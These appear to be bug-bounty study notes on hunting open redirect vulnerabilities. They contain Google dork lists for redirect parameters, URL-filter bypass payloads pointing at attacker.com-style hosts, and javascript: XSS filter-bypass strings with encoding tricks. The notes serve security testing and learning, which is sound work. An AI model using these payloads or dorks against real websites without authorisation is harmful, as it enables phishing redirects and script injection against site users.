Typically, you can spot these when a URL is passed in as a parameter to a web request. Keep an eye out and play with the address to see if it will accept a link to an external site.

>URL validation is extremely difficult to get right!

### High-level:

1. Search for **redirect URL parameters**. These might be vulnerable to parameter-based open redirect. 
2. Search for pages that perform **referer-based redirects**. These are candidates for a referer-based open redirect. 
3. **Test** the pages and parameters you’ve found for open redirects. 
4. If the server blocks the open redirect, try the **protection bypass techniques** mentioned in this chapter. 
5. Brainstorm ways of using the open redirect in your other bug chains! 



### Low-Level:

An attacker can modify the window’s location property by using any of the following JavaScript: ```
```
window.location=https://www.google.com/ 
window.location.href=https://www.google.com 
window.location.replace(https://www.google.com)
```
 Typically, opportunities to set the window.location value occur only where an attacker can execute JavaScript, either via a **cross-site scripting** vulnerability or where the website intentionally allows users to define a URL to redirect to.


> [!Important] Dorking
> Use Google Dorks to find additional redirect parameters (try casing)
```
site:example.com
inurl:%3Dhttp site:example.com 
inurl:%3D%2F site:example.com
inurl:redir site:example.com 
inurl:redirUrl site:example.com 
inurl:redirect site:example.com 
inurl:redirecturi site:example.com 
inurl:redirect_uri site:example.com 
inurl:redirecturl site:example.com 
inurl:redirectUrl site:example.com 
inurl:redirect_uri site:example.com 
inurl:return site:example.com 
inurl:returnTo site:example.com 
inurl:returnurl site:example.com 
inurl:returnUrl site:example.com 
inurl:return_url site:example.com
inurl:rUrl site:example.com
inurl:r_url site:example.com
inurl:history site:example.com
inurl:cancelURL site:example.com 
inurl:relaystate site:example.com 
inurl:forward site:example.com 
inurl:follow site:example.com 
inurl:goto site:example.com 
inurl:goback site:example.com
inurl:forwardurl site:example.com 
inurl:forward_url site:example.com 
inurl:url site:example.com 
inurl:uri site:example.com 
inurl:dest site:example.com 
inurl:destination site:example.com 
inurl:next site:example.com
```

- Some payloads to figure out how the filtering is working:
```
https:attacker.com 
https;attacker.com
\/yoururl.com 
\/\/yoururl.com 
https:/\/\attacker.com
https:\\example.com
\\yoururl.com 
//yoururl.com 
//theirsite@yoursite.com 
/\/yoursite.com 
https://yoursite.com%3F.theirsite.com/ 
https://yoursite.com%2523.theirsite.com/ 
https://yoursite?c=.theirsite.com/ (use # \ also) 
//%2F/yoursite.com 
////yoursite.com 
https://theirsite.computer/ 
https://theirsite.com.mysite.com 
/%0D/yoursite.com (Also try %09, %00, %0a, %07) 
/%2F/yoururl.com 
/%5Cyoururl.com 
//google%E3%80%82com
data:text/html;base64, PHNjcmlwdD5sb2NhdGlvbj0iaHR0cHM6Ly9leGFtcGxlLmNvbSI8L3NjcmlwdD4= 
https://example.com%2f@attacker.com
https://example.com%252f@attacker.com
https://example.com%25252f@attacker.com 
╱ (%E2%95%B1) -> /

```

- One common problem people run into is not encoding the values correctly, especially if the target only allows for /localRedirects. Your payload would look like something like /redirect?goto=https://zseano.com/, but when using this as it is the ?goto= parameter may get dropped in redirects (depending on how the web application works and how many redirects occur!). This also may be the case if it contains multiple parameters (via &) and the redirect parameter may be missed. I will always encode certain values such as & ? # / \ to force the browser to decode it **after** the first redirect. 

`Location: /redirect%3Fgoto=https://www.zseano.com/%253Fexample=hax`

- When hunting for open URL redirects also bear in mind that they can be used for chaining an SSRF vulnerability which is explained more below. 
- If the redirect you discover is via the “Location:” header then XSS will not be possible, however if it redirected via something like “window.location” then you should test for `javascript:` instead of redirecting to your website as XSS will be possible here. Some common ways to bypass filters:
```
java%0d%0ascript%0d%0a:alert(0)

j%0d%0aava%0d%0aas%0d%0acrip%0d%0at%0d%0a:confirm`0`

java%07script:prompt`0`

java%09scrip%07t:prompt`0`

jjavascriptajavascriptvjavascriptajavascriptsjavascriptcjavascriptrjavascriptijavascript pjavascriptt:confirm`0`
```

- Sometimes you will need to double encode them based on how many redirects are made & parameters. 
```
https://example.com/login?return=https://example.com/?redirect=1%26returnurl=http s%3A%2F%2Fwww.google.com%2F

https://example.com/login?return=https%3A%2F%2Fexample.com%2F%3Fredirect= 1%2526returnurl%3Dhttps%253A%252F%252Fwww.google.com%252F
```

